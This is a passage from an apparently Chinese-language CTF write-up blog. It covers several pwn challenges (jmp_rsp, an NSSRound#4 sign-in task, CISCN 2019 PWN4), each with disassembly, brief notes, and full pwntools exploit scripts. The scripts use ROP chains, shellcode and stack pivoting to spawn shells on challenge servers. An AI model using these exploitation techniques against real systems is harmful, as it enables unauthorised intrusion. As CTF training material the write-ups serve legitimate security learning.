class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">offset = <span class="number">0x100</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(offset),rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>]])</span><br><span class="line">sl(payload)</span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">read_addr = get_addr()</span><br><span class="line">info(<span class="string">&quot;puts addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line">info(<span class="string">&quot;read addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(read_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x84420</span></span><br><span class="line">system = <span class="number">0x52290</span> + libc_base</span><br><span class="line">bin_sh = <span class="number">0x1b45bd</span> + libc_base</span><br><span class="line">payload2 = flat([cyclic(offset),rdi,bin_sh,system])</span><br><span class="line">sl(payload2)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="广东省大学生攻防大赛-2022-jmp-rsp"><a href="#广东省大学生攻防大赛-2022-jmp-rsp" class="headerlink" title="[广东省大学生攻防大赛 2022]jmp_rsp"></a>[广东省大学生攻防大赛 2022]jmp_rsp</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000400B5D <span class="comment">; int __fastcall main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D                 <span class="meta">public</span> main</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D main            proc <span class="built_in">near</span>               <span class="comment">; DATA XREF: _start+1D↑o</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">80h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5D                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B5E                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B61                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFF80h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B65                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aThisIsAClassic <span class="comment">; &quot;this is a classic pwn&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B6C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B71                 <span class="keyword">call</span>    printf</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B76                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7A                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">100h</span>       <span class="comment">; count</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7F                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B82                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B87                 <span class="keyword">call</span>    read</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B8C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B91                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B92                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B92 <span class="comment">; &#125; // starts at 400B5D</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B92 main            endp</span><br></pre></td></tr></table></figure>

<p>buf离栈顶0x80距离，读取0x100的大小，这时候buf指向输入的开头，开启了栈可执行</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241113204341-l0h64je.png" alt="image">​</p>
<p>我们找到了call rsi这个magic gadget，这样就可以直接调用buf里面的命令，也就是shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    port = <span class="number">1111</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">call_rsi = <span class="number">0x000000000044e631</span></span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span> + <span class="number">8</span></span><br><span class="line">payload1 = asm(shellcraft.sh())</span><br><span class="line">payload1 = payload1.ljust(offset,<span class="string">b&#x27;\x00&#x27;</span>) + p64(call_rsi)</span><br><span class="line">sl(payload1)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="NSSRound-4-SWPU-真签到题来试试吧"><a href="#NSSRound-4-SWPU-真签到题来试试吧" class="headerlink" title="[NSSRound#4 SWPU]真签到题来试试吧"></a>[NSSRound#4 SWPU]真签到题来试试吧</h3><p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241113204955-uer0tqa.png" alt="image">​</p>
<p>开启了NX</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">void</span> *handle; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, <span class="number">258</span>);<span class="comment">//加载链接库</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;---    ---    ---------    ---------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| | \\  | |   / /----|__|  / /----|__|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |\\ \\ | |   | |_______   | |_______&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| | \\ \\| |   \\ ______  \\  \\ ______  \\&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |  \\ \\ |    _______| |   _______| |&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |   \\__|   |_________/  |_________/&quot;</span>);</span><br><span class="line">  v3 = dlsym(handle, <span class="string">&quot;system&quot;</span>);<span class="comment">//加载system函数地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v3);<span class="comment">//输出地址</span></span><br><span class="line">  vuln(<span class="string">&quot;%p\n&quot;</span>, v3);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;SlVTVCBBIEpPS0UgLCBORVZFUiBNSU5E\n&quot;</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>read往bss段上写入数据，这题有点坑啊，我以为payload错了呢，看了半天加上sleep就成功了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">28705</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rsi_r15 = rop.find_gadget([<span class="string">&#x27;pop rsi&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">rl(<span class="string">&quot;_________/  |_________/\n&quot;</span>)</span><br><span class="line">system = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x000000000404078</span></span><br><span class="line">offset = <span class="number">0x80</span> + <span class="number">8</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p64(rsi_r15) + p64(bin_sh) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>  + p64(rdi) +  p64(bin_sh) + p64(system)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">sl(payload2)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2019华南-PWN4"><a href="#CISCN-2019华南-PWN4" class="headerlink" title="[CISCN 2019华南]PWN4"></a>[CISCN 2019华南]PWN4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现可以写入0x30后print可以泄露出来ebp的值，然后迁移即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">23681</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">leave = rop.find_gadget([<span class="string">&#x27;leave&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(leave)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span></span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line"><span class="comment"># info(&quot;rdi addr : &#123;:#x&#125;&quot;.format(rdi))</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span></span><br><span class="line">s(payload1)</span><br><span class="line">rl(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>)) </span><br><span class="line">success(<span class="string">&quot;fake_ebp: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ebp-<span class="number">0x30</span>))</span><br><span class="line">success(<span class="string">&quot;bin_sh: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ebp-<span class="number">0x38</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;bbbb&#x27;</span> + p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;AAAA&#x27;</span> + p32(ebp-<span class="number">0x28</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(ebp-<span class="number">0x38</span>) + p32(leave)</span><br><span 